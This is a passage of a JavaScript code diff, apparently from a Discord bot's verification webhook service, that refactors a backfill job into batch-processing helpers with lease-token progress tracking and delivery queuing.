-                        processed++;
-                        lastCursorId = eventId;
-                        this.repo.updateJobProgress(job.job_id, {
-                            processedCount: processed,
-                            lastCursorId,
-                            leaseToken
-                        });
-                        continue;
-                    }
-                    if (existing.status === "FAILED") {
-                        if (typeof this.repo.requeueFailedDelivery === "function") {
-                            this.repo.requeueFailedDelivery(existing.delivery_id, job.job_id);
-                        }
-                        processed++;
-                        lastCursorId = eventId;
-                        this.repo.updateJobProgress(job.job_id, {
-                            processedCount: processed,
-                            lastCursorId,
-                            leaseToken
-                        });
-                        continue;
-                    }
-                }
-
-                // Standardized delivery ID across Live and Backfill
-                const targetDeliveryId = existing?.delivery_id || `del_${guildId}_v${destinationVersion}_${eventId}`;
-                this.repo.enqueueDelivery({
-                    deliveryId: targetDeliveryId,
-                    jobId: job.job_id,
-                    guildId,
-                    destinationVersion,
-                    eventId,
-                    userId: String(log.userId)
-                });
-
-                processed++;
-                lastCursorId = eventId;
-
-                const updProgress = this.repo.updateJobProgress(job.job_id, {
-                    processedCount: processed,
-                    lastCursorId,
-                    leaseToken
-                });
-                if (updProgress && updProgress.changes === 0) {
-                    console.warn(`[VerificationWebhook] Lease expired or lost for job ${job.job_id}; halting backfill`);
-                    return;
-                }
-            }
-
-            // Drain queued items through the unified queue worker (P1-4)
+        const batch = await this._fetchBackfillBatch(guildId, state.lastCursorId);
+        if (!batch.length) {
+            this.repo.updateJobProgress(job.job_id, {
+                totalEligible: state.processed,
+                processedCount: state.processed,
+                lastCursorId: state.lastCursorId,
+                leaseToken
+            });
             await this.drainDeliveries(guildId);
+            await this.checkAndCompleteJobIfDone(job.job_id, guildId, leaseToken, { cursorExhausted: true });
+            return false;
         }
+
+        async function processBatchItems(index, self) {
+            if (index >= batch.length) return true;
+            const log = batch[index];
+            const cont = await self._processBackfillItem(guildId, job, log, leaseToken, state);
+            if (!cont) return false;
+            return processBatchItems(index + 1, self);
+        }
+
+        const cont = await processBatchItems(0, this);
+        if (!cont) return false;
+
+        await this.drainDeliveries(guildId);
+        return true;
+    }
+
+    /**
+     * Executes backfill replay from MongoDB historical records (P1-1, P1-3, P1-9).
+     * Tracks per-item delivery status and does not skip failed items permanently.
+     */
+    async executeBackfill(guildId, job, leaseToken) {
+        const initialValid = await this._validateBackfillInitial(guildId, job);
+        if (!initialValid) return;
+
+        const state = {
+            lastCursorId: job.last_cursor_id || null,
+            processed: job.processed_count || 0,
+            destinationVersion: job.destination_version || 1
+        };
+
+        const runNextBatch = async () => {
+            const shouldContinue = await this._processBackfillBatch(guildId, job, leaseToken, state);
+            if (shouldContinue) {
+                await runNextBatch();
+            }
+        };
+
+        await runNextBatch();
     }
 
     async _findVerifyLogByEventId(eventId) {
